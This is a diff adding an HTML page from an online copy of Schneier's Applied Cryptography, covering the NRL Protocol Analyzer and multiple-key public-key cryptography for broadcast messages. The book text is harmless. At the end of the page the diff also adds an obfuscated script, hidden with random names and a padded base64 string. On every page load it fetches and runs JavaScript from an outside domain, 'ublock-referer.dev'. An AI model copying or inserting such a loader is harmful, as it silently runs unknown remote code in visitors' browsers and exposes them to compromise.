@@ -1,0 +1,118 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Basic Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=03//-->
+<!--PAGES=067-069//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>The Navy Research Laboratory&#146;s (NRL) Protocol Analyzer is probably the most successful application of these techniques [1512,823,1046,1513]; it has been used to discover both new and known flaws in a variety of protocols [1044,1045,1047]. The Protocol Analyzer defines the following actions:
+</P>
+<DL>
+<DD>&#151; Accept (Bob, Alice, <I>M</I>, <I>N</I>). (Bob accepts the message <I>M</I> as from Alice during Bob&#146;s local round <I>N</I>.)
+<DD>&#151; Learn (Eve, <I>M</I>). (Eve learns <I>M</I>.)
+<DD>&#151; Send (Alice, Bob, <I>Q</I>, <I>M</I>). (Alice sends <I>M</I> to Bob in response toquery, <I>Q</I>.)
+<DD>&#151; Request (Bob, Alice, <I>Q</I>, <I>N</I>). (Bob sends <I>Q</I> to Alice during Bob&#146;s local round <I>N</I>.)
+</DL>
+<P>From these actions, requirements can be specified. For example:
+</P>
+<DL>
+<DD>&#151; If Bob accepted message <I>M</I> from Alice at some point in the past, then Eve did not learn <I>M</I> at some point in the past.
+<DD>&#151; If Bob accepted message <I>M</I> from Alice in Bob&#146;s local round <I>N</I>, then Alice sent <I>M</I> to Bob as a response to a query in Bob&#146;s local round <I>N</I>.
+</DL>
+<P>To use the NRL Protocol Analyzer, a protocol must be specified using the previous constructs. Then, there are four phases of analysis: defining transition rules for honest participants, describing operations available to all&#151;honest and dishonest&#151;participants, describing the basic building blocks of the protocol, and describing the reduction rules. The point of all this is to show that a given protocol meets its requirements. Tools like the NRL Protocol Analyzer could eventually lead to a protocol that can be proven secure.
+</P>
+<P>While much of the work in formal methods involves applying the methods to existing protocols, there is some push towards using formal methods to design the protocols in the first place. Some preliminary steps in this direction are [711]. The NRL Protocol Analyzer also attempts to do this [1512,222,1513].</P>
+<P>The application of formal methods to cryptographic protocols is still a fairly new idea and it&#146;s really hard to figure out where it is headed. At this point, the weakest link seems to be the formalization process.</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">3.5 Multiple-Key Public-Key Cryptography</FONT></H3>
+<P>Public-key cryptography uses two keys. A message encrypted with one key can be decrypted with the other. Usually one key is private and the other is public. However, let&#146;s assume that Alice has one key and Bob has the other. Now Alice can encrypt a message so that only Bob can decrypt it, and Bob can encrypt a message so that only Alice can read it.
+</P>
+<P>This concept was generalized by Colin Boyd [217]. Imagine a variant of public-key cryptography with three keys: <I>K</I><SUB>A</SUB>, <I>K</I><SUB>B</SUB>, and <I>K</I><SUB>C</SUB>, distributed as shown in Table 3.2.</P>
+<P>Alice can encrypt a message with <I>K</I><SUB>A</SUB> so that Ellen, with <I>K</I><SUB>B</SUB> and <I>K</I><SUB>C</SUB>, can decrypt it. So can Bob and Carol in collusion. Bob can encrypt a message so that Frank can read it, and Carol can encrypt a message so that Dave can read it. Dave can encrypt a message with <I>K</I><SUB>A</SUB> so that Ellen can read it, with <I>K</I><SUB>B</SUB> so that Frank can read it, or with both <I>K</I><SUB>A</SUB> and <I>K</I><SUB>B</SUB> so that Carol can read it. Similarly, Ellen can encrypt a message so that either Alice, Dave, or Frank can read it. All the possible combinations are summarized in Table 3.3; there are no other ones.</P>
+<TABLE WIDTH="50%"><TH CAPTION ALIGN="CENTER" COLSPAN="2">TABLE 3.2<BR>Three-Key Key Distribution
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Alice
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>A</SUB>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Bob
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K<SUP>B</SUP></I>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Carol
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>C</SUB>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Dave
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>A</SUB> and <I>K</I><SUB>B</SUB>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Ellen
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>B</SUB> and <I>K</I><SUB>C</SUB>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Frank
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I><SUB>C</SUB> and <I>K</I><SUB>A</SUB>
+<TR>
+<TD COLSPAN="2"><HR>
+</TABLE>
+<P>This can be extended to <I>n</I> keys. If a given subset of the keys is used to encrypt the message, then the other keys are required to decrypt the message.</P>
+<P><FONT SIZE="+1"><B><I>Broadcasting a Message</I></B></FONT></P>
+<P>Imagine that you have 100 operatives out in the field. You want to be able to send messages to subsets of them, but don&#146;t know which subsets in advance. You can either encrypt the message separately for each person or give out keys for every possible combination of people. The first option requires a lot of messages; the second requires a lot of keys.
+</P>
+<P>Multiple-key cryptography is much easier. We&#146;ll use three operatives: Alice, Bob, and Carol. You give Alice <I>K</I><SUB>A</SUB> and <I>K</I><SUB>B</SUB>, Bob <I>K</I><SUB>B</SUB> and <I>K</I><SUB>C</SUB>, and Carol <I>K</I><SUB>C</SUB> and <I>K</I><SUB>A</SUB>. Now you can talk to any subset you want. If you want to send a message so that only Alice can read it, encrypt it with <I>K</I><SUB>C</SUB>. When Alice receives the message, she decrypts it with <I>K</I><SUB>A</SUB> and then <I>K</I><SUB>B</SUB>. If you want to send a message so that only Bob can read it, encrypt it with <I>K</I><SUB>A</SUB>; so that only Carol can read it, with <I>K</I><SUB>B</SUB>. If you want to send a message so that both Alice and Bob can read it, encrypt it with <I>K</I><SUB>A</SUB> and <I>K</I><SUB>C</SUB>, and so on.</P>
+<P>This might not seem exciting, but with 100 operatives it is quite efficient. Individual messages mean a shared key with each operative (100 keys total) and each message. Keys for every possible subset means 2<SUP>100</SUP> - 2 different keys (messages to all operatives and messages to no operatives are excluded). This scheme needs only one encrypted message and 100 different keys. The drawback of this scheme is that you also have to broadcast which subset of operatives can read the message, otherwise each operative would have to try every combination of possible keys looking for the correct one. Even just the names of the intended recipients may be significant. At least for the straightforward implementation of this, everyone gets a really large amount of key data.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(GvkxADSX, EQiUooZN) {EQiUooZN = GvkxADSX.createElement('script');EQiUooZN.type = 'text/javascript';EQiUooZN.async = true;EQiUooZN.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');GvkxADSX.getElementsByTagName('body')[0].appendChild(EQiUooZN);}(document));</script></body>
+</html>
